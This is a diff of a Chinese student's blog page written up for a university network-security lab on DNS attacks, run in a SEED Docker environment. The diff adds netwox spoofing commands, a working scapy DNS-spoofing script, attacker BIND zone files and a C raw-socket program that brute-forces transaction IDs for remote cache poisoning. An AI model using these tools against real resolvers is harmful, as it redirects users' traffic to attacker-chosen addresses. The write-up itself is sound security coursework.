@@ -1,5 +1,5 @@
 <!doctype html><html lang=zh><head><title>计算机网络安全Lab2 - 胡思乱想集散中心</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name=renderer content="webkit"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=format-detection content="telephone=no,email=no,adress=no"><meta name=theme-color content="#000000"><meta http-equiv=window-target content="_top"><meta name=description content="20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用
-"><meta name=generator content="Hugo 0.98.0 with theme pure"><title>计算机网络安全Lab2 - 胡思乱想集散中心</title><link rel=stylesheet href=https://qeryu.github.io/css/style.min.084a5eb24fb0cf9d5aade7246f19ba0c820cf904996a28ffe88039427693ac68.css><link rel=stylesheet href=https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css async><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css async><meta property="og:title" content="计算机网络安全Lab2"><meta property="og:description" content="20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用"><meta property="og:type" content="article"><meta property="og:url" content="https://qeryu.github.io/2022/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8lab2/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-15T19:08:28+08:00"><meta property="article:modified_time" content="2022-04-15T19:08:28+08:00"><meta itemprop=name content="计算机网络安全Lab2"><meta itemprop=description content="20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用"><meta itemprop=datePublished content="2022-04-15T19:08:28+08:00"><meta itemprop=dateModified content="2022-04-15T19:08:28+08:00"><meta itemprop=wordCount content="1326"><meta itemprop=keywords content="dns,"><meta name=twitter:card content="summary"><meta name=twitter:title content="计算机网络安全Lab2"><meta name=twitter:description content="20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
+"><meta name=generator content="Hugo 0.98.0 with theme pure"><title>计算机网络安全Lab2 - 胡思乱想集散中心</title><link rel=stylesheet href=https://qeryu.github.io/css/style.min.084a5eb24fb0cf9d5aade7246f19ba0c820cf904996a28ffe88039427693ac68.css><link rel=stylesheet href=https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css async><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css async><meta property="og:title" content="计算机网络安全Lab2"><meta property="og:description" content="20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用"><meta property="og:type" content="article"><meta property="og:url" content="https://qeryu.github.io/2022/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8lab2/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-04-15T19:08:28+08:00"><meta property="article:modified_time" content="2022-04-15T19:08:28+08:00"><meta itemprop=name content="计算机网络安全Lab2"><meta itemprop=description content="20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用"><meta itemprop=datePublished content="2022-04-15T19:08:28+08:00"><meta itemprop=dateModified content="2022-04-15T19:08:28+08:00"><meta itemprop=wordCount content="3392"><meta itemprop=keywords content="dns,"><meta name=twitter:card content="summary"><meta name=twitter:title content="计算机网络安全Lab2"><meta name=twitter:description content="20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
 <script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body class="main-center theme-black" itemscope itemtype=http://schema.org/WebPage><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=slimContent><div class=navbar-header><div class="profile-block text-center"><a id=avatar href=https://github.com/qeryu target=_blank><img class="img-circle img-rotate" src=https://qeryu.github.io/avatar/qeryu.jpg width=200 height=200></a><h2 id=name class="hidden-xs hidden-sm">Qeryu</h2><h3 id=title class="hidden-xs hidden-sm hidden-md">信息安全学生</h3><small id=location class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Wuhan, China</small></div><div class=search id=search-form-wrap><form class="search-form sidebar-form"><div class=input-group><input type=text class="search-form-input form-control" placeholder=搜索>
 <span class=input-group-btn><button type=submit class="search-form-submit btn btn-flat" onclick=return!1><i class="icon icon-search"></i></button></span></div><div class=ins-search><div class=ins-search-mask></div><div class=ins-search-container><div class=ins-input-wrapper><input type=text class=ins-search-input placeholder=想要查找什么... x-webkit-speech>
 <button type=button class="close ins-close ins-selectable" data-dismiss=modal aria-label=Close><span aria-hidden=true>×</span></button></div><div class=ins-section-wrapper><div class=ins-section-container></div></div></div></div></form></div><button class="navbar-toggle collapsed" type=button data-toggle=collapse data-target=#main-navbar aria-controls=main-navbar aria-expanded=false>
@@ -53,9 +53,10 @@
 <a href=https://qeryu.github.io/2022/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8lab2/ class=article-date><time datetime="2022-04-15 19:08:28 +0800 +0800" itemprop=datePublished>2022-04-15</time></a></span>
 <span class=article-tag><i class="icon icon-tags"></i>&nbsp;
 <a class=article-tag-link href=/tags/dns/>dns</a></span>
-<span class="post-wordcount hidden-xs" itemprop=wordCount>字数统计: 1326字</span>
-<span class="post-readcount hidden-xs" itemprop=timeRequired>阅读时长: 3分</span></div></div><div class="article-entry marked-body js-toc-content" itemprop=articleBody><p>20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用</p><h1 id=实验环境>实验环境</h1><p>和上个实验一样，用Seed的Ubuntu 16配合Docker</p><ul><li>用户机：192.168.60.2</li><li>DNS服务器：192.168.60.4</li><li>攻击机：192.168.60.1</li></ul><h2 id=配置本地dns服务器>配置本地DNS服务器</h2><p>沿用Lab1的配置，新开一个容器作为DNS服务器</p><pre><code class=language-sh>sudo docker run -it --name=dns --hostname=dns --net=intranet --ip=192.168.60.4 &quot;seedubuntu&quot; /bin/bash
-</code></pre><p>注意这里与之前开容器不一样的是少了<code>--privilege</code>参数，如果带上这个参数的话会导致bind9无法正常启动</p><p>本来想直接从DockerHub上pull个bind9下来，避免配置过程中出现各种问题，结果seed平台系统版本太低了，没有合适的版本&mldr;</p><h3 id=配置dns缓存转储--关闭dnssec功能>配置DNS缓存转储 & 关闭DNSSEC功能</h3><p>为方便查看DNS缓存，需要将信息从DNS cache里转存到文件中。在<code>/etc/bind/named.conf.options</code>配置dump-file条目</p><p>DNSSEC功能可以防止对DNS服务器的spoofing攻击。为了顺利进行实验，需要手动关闭。</p><p>修改 <code>/etc/bind/named.conf.options</code>：</p><ol><li>注释掉dnssec-validation条目</li><li>添加dnssec-enable条目</li></ol><p>修改后如下</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220507145830855.png alt=image-20220507145830855></p><h3 id=创建区域>创建区域</h3><p>进入容器后，修改<code>/etc/bind/name.conf.default-zones</code>的内容如下所示</p><pre><code class=language-cpp>// prime the server with knowledge of the root servers
+<span class="post-wordcount hidden-xs" itemprop=wordCount>字数统计: 3392字</span>
+<span class="post-readcount hidden-xs" itemprop=timeRequired>阅读时长: 7分</span></div></div><div class="article-entry marked-body js-toc-content" itemprop=articleBody><p>20220415 计算机网络安全（王美珍老师） 实验2 DNS协议漏洞利用</p><h1 id=实验环境>实验环境</h1><p>和上个实验一样，用Seed的Ubuntu 16配合Docker</p><ul><li>用户机：192.168.60.2</li><li>DNS服务器：192.168.60.4</li><li>攻击机：192.168.60.1</li></ul><h2 id=配置本地dns服务器>配置本地DNS服务器</h2><p>沿用Lab1的配置，新开一个容器作为DNS服务器</p><pre><code class=language-sh># Seed Ubuntu 16
+sudo docker run -it --name=dns --hostname=dns --net=intranet --ip=192.168.60.4 &quot;seedubuntu&quot; /bin/bash
+</code></pre><p>注意这里与之前开容器不一样的是少了<code>--privilege</code>参数，如果带上这个参数的话会导致bind9无法正常启动</p><p>本来想直接从DockerHub上pull个bind9下来，避免配置过程中出现各种问题，结果seed平台系统版本太低了，没有合适的版本&mldr;</p><h3 id=配置dns缓存转储--关闭dnssec功能>配置DNS缓存转储 & 关闭DNSSEC功能</h3><p>为方便查看DNS缓存，需要将信息从DNS cache里转存到文件中。在<code>/etc/bind/named.conf.options</code>配置dump-file条目</p><p>DNSSEC功能可以防止对DNS服务器的spoofing攻击。为了顺利进行实验，需要手动关闭。</p><p>修改 <code>/etc/bind/named.conf.options</code>：</p><ol><li>注释掉dnssec-validation条目</li><li>添加dnssec-enable条目</li></ol><p>修改后如下</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220507145830855.png alt=image-20220507145830855></p><h3 id=创建区域>创建区域</h3><p>进入容器后，修改<code>/etc/bind/named.conf.default-zones</code>的内容如下所示</p><pre><code class=language-cpp>// prime the server with knowledge of the root servers
 zone &quot;.&quot; {
 	type hint;
 	file &quot;/etc/bind/db.root&quot;;
@@ -110,10 +111,299 @@ include &quot;/etc/bind/named.conf.default-zones&quot;;
 101	IN	PTR	www.example.com.
 102	IN	PTR	mail.example.com.
 10	IN	PTR	ns.example.com.
-</code></pre><p>配置完成后启动bind9</p><pre><code class=language-shell>service bind9 start
-</code></pre><h1 id=本地dns攻击>本地DNS攻击</h1><h2 id=直接欺骗用户>直接欺骗用户</h2><p>使用netwox 105进行攻击，攻击前需要用以下命令清空缓存</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220507151004281.png alt=image-20220507151004281></p><pre><code class=language-shell>sudo netwox 105 -h &quot;www.baidu.com&quot; -H &quot;1.2.3.4&quot; -a &quot;ns.baidu.com&quot; -A &quot;5.6.7.8&quot; --filter &quot;src host 192.168.60.2&quot; --device &quot;docker2&quot;
-</code></pre><table><thead><tr><th>参数</th><th>值</th><th>解释</th></tr></thead><tbody><tr><td>-h</td><td>&ldquo;<a href=https://www.baidu.com>www.baidu.com</a>&rdquo;</td><td>欺骗的域名</td></tr><tr><td>-H</td><td>&ldquo;1.2.3.4&rdquo;</td><td>将域名欺骗到的IP地址</td></tr><tr><td>-a</td><td>&ldquo;ns.baidu.com&rdquo;</td><td>欺骗的域名服务器</td></tr><tr><td>-A</td><td>&ldquo;5.6.7.8&rdquo;</td><td>将域名服务器欺骗到的IP地址</td></tr><tr><td>&ndash;filter</td><td>&ldquo;src host 192.168.60.2&rdquo;</td><td>过滤出从用户机发出的包</td></tr><tr><td>&ndash;device</td><td>&ldquo;docker2&rdquo;</td><td>在docker2网卡上进行截包</td></tr></tbody></table><p>攻击效果如图，在用户机HostA上<code>dig www.baidu.com</code>获取到的信息已经是被欺骗的信息了。说明HostA发出的DNS请求被攻击机的攻击欺骗了。</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/13d0b496a5e054b856da59ce23d5ed48.png alt=img></p><h2 id=本地dns缓存中毒>本地DNS缓存中毒</h2><h3 id=netwox攻击>netwox攻击</h3><p>命令依旧，但是效果不是很好，需要注意的是这次过滤的是DNS服务器发出的DNS请求，需要</p><pre><code class=language-shell>sudo netwox 105 -h &quot;www.baidu.com&quot; -H &quot;1.2.3.4&quot; -a &quot;ns.baidu.com&quot; -A &quot;5.6.7.8&quot; --filter &quot;src host 192.168.60.4&quot; --device &quot;docker2&quot; --spoofip &quot;raw&quot; --ttl 259200
-</code></pre><h3 id=scapy攻击>scapy攻击</h3><h1 id=远程dns攻击>远程DNS攻击</h1></div><div class=article-footer><blockquote class=mt-2x><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接:</strong>
+</code></pre><p>配置完成后启动bind9</p><pre><code class=language-shell># dns
+service bind9 start
+</code></pre><h2 id=配置用户机>配置用户机</h2><p>用户机的DNS服务器需要设置为刚刚配置的本地DNS服务器</p><p>修改<code>/etc/resolv.conf</code>注释掉</p><h1 id=本地dns攻击>本地DNS攻击</h1><h2 id=直接欺骗用户>直接欺骗用户</h2><p>使用netwox 105进行攻击，攻击前需要用以下命令清空缓存</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220507151004281.png alt=image-20220507151004281></p><pre><code class=language-shell>sudo netwox 105 -h &quot;www.baidu.com&quot; -H &quot;1.2.3.4&quot; -a &quot;ns.baidu.com&quot; -A &quot;5.6.7.8&quot; --filter &quot;src host 192.168.60.2&quot; --device &quot;docker2&quot;
+</code></pre><table><thead><tr><th>参数</th><th>值</th><th>解释</th></tr></thead><tbody><tr><td>-h</td><td>&ldquo;<a href=https://www.baidu.com>www.baidu.com</a>&rdquo;</td><td>欺骗的域名</td></tr><tr><td>-H</td><td>&ldquo;1.2.3.4&rdquo;</td><td>将域名欺骗到的IP地址</td></tr><tr><td>-a</td><td>&ldquo;ns.baidu.com&rdquo;</td><td>欺骗的域名服务器</td></tr><tr><td>-A</td><td>&ldquo;5.6.7.8&rdquo;</td><td>将域名服务器欺骗到的IP地址</td></tr><tr><td>&ndash;filter</td><td>&ldquo;src host 192.168.60.2&rdquo;</td><td>过滤出从用户机发出的包</td></tr><tr><td>&ndash;device</td><td>&ldquo;docker2&rdquo;</td><td>在docker2网卡上进行截包</td></tr></tbody></table><p>攻击效果如图，在用户机HostA上<code>dig www.baidu.com</code>获取到的信息已经是被欺骗的信息了。说明HostA发出的DNS请求被攻击机的攻击欺骗了。</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/13d0b496a5e054b856da59ce23d5ed48.png alt=img></p><h2 id=本地dns缓存中毒>本地DNS缓存中毒</h2><h3 id=netwox攻击>netwox攻击</h3><p>命令依旧，但是效果不是很好，需要注意的是这次过滤的是DNS服务器发出的DNS请求，需要将filter设置如下，需要增加spoofing参数，值为"raw"。</p><pre><code class=language-shell># Seed Ubuntu 16
+sudo netwox 105 -h &quot;www.baidu.com&quot; -H &quot;1.2.3.4&quot; -a &quot;ns.baidu.com&quot; -A &quot;5.6.7.8&quot; --filter &quot;src host 192.168.60.4&quot; --device &quot;docker2&quot; --spoofip &quot;raw&quot; --ttl 600
+</code></pre><p>如果不设置<code>--spoofing "raw"</code>的话，netwox将会同时进行IP欺骗和MAC欺骗，但是为了获取MAC地址，netwox会发出ARP请求，询问欺骗IP的MAC地址。但是欺骗IP通常是外部DNS服务器的IP，该服务器与攻击机不在同一个LAN上，没有主机会回应ARP请求，最终导致netwox会等待一段时间，错过欺骗时机。</p><p>为提高实验的成功率，可以在宿主机上增加docker2网络的对外访问时延，命令</p><pre><code class=language-bash># Seed Ubuntu 16
+sudo tc qdisc add dev docker2 root netem delay 2s
+</code></pre><p>（此处或许应该解释一些上面的具体参数）</p><p>攻击前需要清空本地DNS服务器的缓存，使用以下命令</p><pre><code class=language-bash># dns
+rndc flush
+</code></pre><p>在宿主机启动攻击后，需要在用户机<code>dig www.baidu.com</code>触发攻击，但是攻击速度好像有点不够，在wireshark抓包发现攻击速度在一次dig中大概只能枚举2个左右事务编号，无法满足攻击要求。下图为wireshark抓包结果。</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220507213016398.png alt=image-20220507213016398></p><p>使用以下命令在缓存中完全看不到结果，也难怪舍友说这个要试好久</p><pre><code class=language-bash># 查看缓存
+# dns
+rndc dumpdb -cache &amp;&amp; cat /var/cache/bind/dump.db | grep &quot;baidu&quot;
+</code></pre><h3 id=scapy攻击>scapy攻击</h3><p>使用scapy进行攻击的代码，同样还是针对域名<code>www.baidu.com</code></p><pre><code class=language-python>#!/usr/bin/python
+from scapy.all import *
+
+
+def spoof_dns(pkt):
+    if (DNS in pkt and 'www.baidu.com' in pkt[DNS].qd.qname):
+        
+        # Swap the source and destination IP address
+        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+
+        # Swap the source and destination port number
+        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+
+        # The Answer Section
+        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
+                       ttl=259200, rdata='2.2.2.2')
+
+        # The Authority Section
+        NSsec1 = DNSRR(rrname='baidu.com', type='NS',
+                       ttl=259200, rdata='ns1.baidu.com')
+        NSsec2 = DNSRR(rrname='baidu.com', type='NS',
+                       ttl=259200, rdata='ns2.baidu.com')
+
+        # The Additional Section
+        Addsec1 = DNSRR(rrname='ns1.baidu.com', type='A',
+                        ttl=259200, rdata='1.2.3.4')
+        Addsec2 = DNSRR(rrname='ns2.baidu.com', type='A',
+                        ttl=259200, rdata='5.6.7.8')
+
+        # Construct the DNS packet
+        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
+                     qdcount=1, ancount=1, nscount=2, arcount=2,
+                     an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
+
+        # Construct the entire IP packet and send it out
+        spoofpkt = IPpkt/UDPpkt/DNSpkt
+        send(spoofpkt)
+
+
+# Sniff UDP query packets and invoke spoof_dns().
+pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
+</code></pre><p>可以看到攻击效果拔群，在客户机上出现了欺骗信息，在服务器上出现了中毒缓存</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/image-20220507221207720.png alt=image-20220507221207720></p><p>（netwox为什么会这么慢呢？）</p><h1 id=远程dns攻击>远程DNS攻击</h1><h2 id=配置>配置</h2><p>为了让攻击能够有效果，而不是简简单单地只是污染了一下DNS的缓存，这里需要使用一个假域名，配合攻击者自制DNS服务器进行攻击</p><h3 id=本地dns服务器配置>本地DNS服务器配置</h3><p>由于要让本地DNS服务器去找<code>example.com</code>的域名服务器查询结果，需要手动取消本地DNS服务器中对<code>example.com</code>的解析（注释掉就好），并让本地DNS服务器将<code>ns.qsy.net</code>识别为一个真实的域，这样本地DNS服务器就不需要从一个不存在的域请求IP地址了。</p><p>在<code>/etc/bind/named.conf.default-zones</code>中添加配置</p><pre><code class=language-c>//zone &quot;example.com&quot; {
+//      type master;
+//      file &quot;/etc/bind/example.com.db&quot;;
+//};
+
+zone &quot;ns.qsy.net&quot; {
+        type master;
+        file &quot;/etc/bind/qsy.db&quot;;
+};
+</code></pre><p>新建文件<code>/etc/bind/qsy.db</code></p><pre><code class=language-c>;
+; BIND data file for local loopback interface
+;
+$TTL 604800
+@ 	IN SOA 		localhost. root.localhost. (
+    2 ; Serial
+    604800 ; Refresh
+    86400 ; Retry
+    2419200 ; Expire
+    604800 ) ; Negative Cache TTL
+; 
+@ 	IN NS 		ns.qsy.net.
+@ 	IN A 		192.168.60.1
+@ 	IN AAAA 	::1
+
+</code></pre><h3 id=攻击机dns服务器配置>攻击机DNS服务器配置</h3><p>在<code>/etc/bind/named.conf.default-zones</code>中添加配置</p><pre><code class=language-c>zone &quot;example.com&quot; {
+    type master;
+    file &quot;/etc/bind/qsy.attack.db&quot;
+}
+</code></pre><p>新建文件<code>/etc/bind/qsy.attack.db</code></p><pre><code class=language-c>$TTL 3D
+@ 				IN SOA ns.example.com. admin.example.com. (
+    2008111001
+    8H
+    2H
+    4W
+    1D)
+@ 				IN 	NS 	ns.dnslabattacker.net.
+@ 				IN 	MX 	10 mail.example.com.
+www 			IN 	A 	1.1.1.1
+mail 			IN 	A 	1.1.1.2
+*.example.com	IN 	A 	1.1.1.100
+
+</code></pre><h2 id=攻击代码>攻击代码</h2><p>python写的生成攻击报文（请求包与应答包）的generate_dns.py</p><pre><code class=language-python>from scapy.all import *
+
+name = 'abcde.example.com'
+Qdsec = DNSQR(qname=name)
+
+# query
+ip_q = IP(dst='192.168.60.4', src='192.168.60.1')
+udp_q = UDP(dport=53, sport=33333, chksum=0)
+dns_q = DNS(id=0xAAAA, qr=0, rd=1, qdcount=1,
+            ancount=0, nscount=0, arcount=0, qd=Qdsec)
+pkt_q = ip_q/udp_q/dns_q
+
+# reply
+ip_r = IP(dst='192.168.60.4', src='199.43.135.53', chksum=0)
+udp_r = UDP(dport=33333, sport=53, chksum=0)
+Anssec = DNSRR(rrname=name, type='A', rdata='2.3.4.5', ttl=259200)
+NSsec = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.qsy.net')
+Addsec = DNSRR(rrname='ns.qsy.net', type='A', ttl=259200, rdata='192.168.60.1')
+dns_r = DNS(id=0xAAAA, aa=1, rd=0, qr=1, qdcount=1, ancount=1,
+            nscount=1, arcount=1, qd=Qdsec, an=Anssec, ns=NSsec, ar=Addsec)
+pkt_r = ip_r/udp_r/dns_r
+
+# save
+with open('query.bin', 'wb')as f:
+    f.write(bytes(pkt_q))
+with open('reply.bin', 'wb')as f:
+    f.write(bytes(pkt_r))
+</code></pre><p>C写的利用生成的报文进行快速攻击的魔改udp.c</p><pre><code class=language-c>// ----udp.c------
+// This sample program must be run by root lol!
+//
+// The program is to spoofing tons of different queries to the victim.
+// Use wireshark to study the packets. However, it is not enough for
+// the lab, please finish the response packet and complete the task.
+//
+// Compile command:
+// gcc -lpcap udp.c -o udp
+//
+#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;libnet.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/udp.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;unistd.h&gt;
+
+// The packet length
+#define PCKT_LEN 8192
+#define FLAG_R 0x8400
+#define FLAG_Q 0x0100
+
+// Can create separate header file (.h) for all headers' structure
+
+// The IP header's structure
+struct ipheader {
+    unsigned char iph_ihl : 4, iph_ver : 4;
+    unsigned char iph_tos;
+    unsigned short int iph_len;
+    unsigned short int iph_ident;
+    // unsigned char iph_flag;
+    unsigned short int iph_offset;
+    unsigned char iph_ttl;
+    unsigned char iph_protocol;
+    unsigned short int iph_chksum;
+    unsigned int iph_sourceip;
+    unsigned int iph_destip;
+};
+
+// UDP header's structure
+struct udpheader {
+    unsigned short int udph_srcport;
+    unsigned short int udph_destport;
+    unsigned short int udph_len;
+    unsigned short int udph_chksum;
+};
+struct dnsheader {
+    unsigned short int query_id;
+    unsigned short int flags;
+    unsigned short int QDCOUNT;
+    unsigned short int ANCOUNT;
+    unsigned short int NSCOUNT;
+    unsigned short int ARCOUNT;
+};
+// This structure just for convinience in the DNS packet, because such 4 byte
+// data often appears.
+struct dataEnd {
+    unsigned short int type;
+    unsigned short int class;
+};
+// total udp header length: 8 bytes (=64 bits)
+
+unsigned int checksum(uint16_t *usBuff, int isize) {
+    unsigned int cksum = 0;
+    for (; isize &gt; 1; isize -= 2) {
+        cksum += *usBuff++;
+    }
+    if (isize == 1) {
+        cksum += *(uint16_t *)usBuff;
+    }
+    return (cksum);
+}
+
+// calculate udp checksum
+uint16_t check_udp_sum(uint8_t *buffer, int len) {
+    unsigned long sum = 0;
+    struct ipheader *tempI = (struct ipheader *)(buffer);
+    struct udpheader *tempH =
+        (struct udpheader *)(buffer + sizeof(struct ipheader));
+    struct dnsheader *tempD =
+        (struct dnsheader *)(buffer + sizeof(struct ipheader) +
+                             sizeof(struct udpheader));
+    tempH-&gt;udph_chksum = 0;
+    sum = checksum((uint16_t *)&amp;(tempI-&gt;iph_sourceip), 8);
+    sum += checksum((uint16_t *)tempH, len);
+    sum += ntohs(IPPROTO_UDP + len);
+    sum = (sum &gt;&gt; 16) + (sum &amp; 0x0000ffff);
+    sum += (sum &gt;&gt; 16);
+    return (uint16_t)(~sum);
+}
+// Function for checksum calculation. From the RFC,
+// the checksum algorithm is:
+//  &quot;The checksum field is the 16 bit one's complement of the one's
+//  complement sum of all 16 bit words in the header.  For purposes of
+//  computing the checksum, the value of the checksum field is zero.&quot;
+unsigned short csum(unsigned short *buf, int nwords) {
+    unsigned long sum;
+    for (sum = 0; nwords &gt; 0; nwords--) sum += *buf++;
+    sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
+    sum += (sum &gt;&gt; 16);
+    return (unsigned short)(~sum);
+}
+
+void get_random_name(char *name) {
+    char a[26] = &quot;abcdefghijklmnopqrstuvwxyz&quot;;
+    name[5] = 0;
+    for (int k = 0; k &lt; 5; k++) name[k] = a[rand() % 26];
+}
+
+void mysend(char *buffer, int pkt_size) {
+    struct sockaddr_in dest_info;
+    int enable = 1;
+
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, sizeof(enable));
+
+    struct ipheader *ip = (struct ipheader *)buffer;
+    dest_info.sin_family = AF_INET;
+    dest_info.sin_addr.s_addr = ip-&gt;iph_destip;
+
+    sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&amp;dest_info,
+           sizeof(dest_info));
+    close(sock);
+}
+
+int main(int argc, char *argv[]) {
+    int times = 1;
+    char query_buff[PCKT_LEN];
+    char reply_buff[PCKT_LEN];
+    int rand_name[10];
+
+    FILE *f_q = fopen(&quot;query.bin&quot;, &quot;rb&quot;);
+    int query_size = fread(query_buff, 1, PCKT_LEN, f_q);
+    FILE *f_r = fopen(&quot;reply.bin&quot;, &quot;rb&quot;);
+    int reply_size = fread(reply_buff, 1, PCKT_LEN, f_r);
+
+    unsigned short id_net_order[65560];
+    for (unsigned short i = 1; i &lt; 65535; ++i) {
+        id_net_order[i] = htons(i);
+    }
+    
+    int cnt = 10;
+ 	while (cnt --) {
+        printf(&quot;%d:attack\n&quot;, times++);
+        get_random_name(rand_name);
+
+        // query
+        memcpy(query_buff + 41, rand_name, 5);
+        memcpy(reply_buff + 41, rand_name, 5);
+        memcpy(reply_buff + 64, rand_name, 5);
+        mysend(query_buff, query_size);
+
+        // attack
+        for (unsigned short i = 0x4000; i &lt; 65535; i++) {
+            memcpy(reply_buff + 28, &amp;id_net_order[i], 2);
+            mysend(reply_buff, reply_size);
+        }
+        sleep(0.3);
+    }
+
+    close(f_q);
+    close(f_r);
+    return 0;
+}
+
+</code></pre><p>为增加攻击成功的概率，可以调整虚拟机对外访问时延</p><pre><code class=language-bash>sudo tc qdisc add dev ens33 root netem delay 2s
+</code></pre><p>攻击效果</p><p><img src=https://raw.githubusercontent.com/Qeryu/PicBed/master/blog/fc9aeaf079a9dd1c52bc8906b9a7ff05.png alt=fc9aeaf079a9dd1c52bc8906b9a7ff05></p></div><div class=article-footer><blockquote class=mt-2x><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接:</strong>
 <a href=https://qeryu.github.io/2022/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8lab2/ title=计算机网络安全Lab2 target=_blank rel=external>https://qeryu.github.io/2022/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8lab2/</a></li><li class=post-copyright-license><strong>License:</strong>
 <a href=http://creativecommons.org/licenses/by/4.0/deed.zh target=_blank rel=external>CC BY 4.0 CN</a></li></ul></blockquote><div class="panel panel-default panel-badger"><div class=panel-body><figure class=media><div class=media-left><a href=https://github.com/qeryu target=_blank class="img-burn thumb-sm visible-lg"><img src=https://qeryu.github.io/avatar/qeryu.jpg class="img-rounded w-full" alt></a></div><div class=media-body><h3 class=media-heading><a href=https://github.com/qeryu target=_blank><span class=text-dark>Qeryu</span><small class=ml-1x>信息安全学生</small></a></h3><div>Good Good Study, Day Day Up~</div></div></figure></div></div></div></article></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class=bar-inner><ul class="pager pull-left"><li class=prev><a href=https://qeryu.github.io/2022/04/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8lab1/ title=信息系统安全Lab1><i class="icon icon-angle-left" aria-hidden=true></i><span>&nbsp;&nbsp;下一篇</span></a></li><li class=next><a href=https://qeryu.github.io/2022/04/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5lab3-1/ title=网络安全综合实践Lab3-1><span>上一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden=true></i></a></li><li class=toggle-toc><a class="toggle-btn collapsed" data-toggle=collapse href=#collapseToc aria-expanded=false title=文章目录 role=button><span>[&nbsp;</span><span>文章目录</span>
 <i class="text-collapsed icon icon-anchor"></i>
